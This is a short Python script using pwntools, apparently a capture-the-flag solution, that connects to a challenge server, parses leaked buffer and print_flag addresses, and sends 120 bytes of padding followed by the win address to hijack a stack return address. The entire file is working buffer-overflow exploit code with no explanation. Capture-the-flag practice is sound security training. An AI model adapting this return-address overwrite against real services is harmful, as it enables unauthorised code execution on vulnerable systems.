#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

HOST = "overflow.challenges2.ctf.dscjssstuniv.in"
PORT = 9001

io = remote(HOST, PORT)

io.recvuntil(b"Buffer address: ")
buffer_addr = int(io.recvline().strip(), 16)

io.recvuntil(b"Secret function address: ")
win_addr = int(io.recvline().strip(), 16)

log.info(f"Buffer address: {hex(buffer_addr)}")
log.info(f"print_flag() address: {hex(win_addr)}")

offset = 120

payload = b"A" * offset + p64(win_addr)

io.sendline(payload)

print("\n" + "=" * 50)
print(io.recvall(timeout=2).decode(errors="ignore"))
print("=" * 50)

io.close()
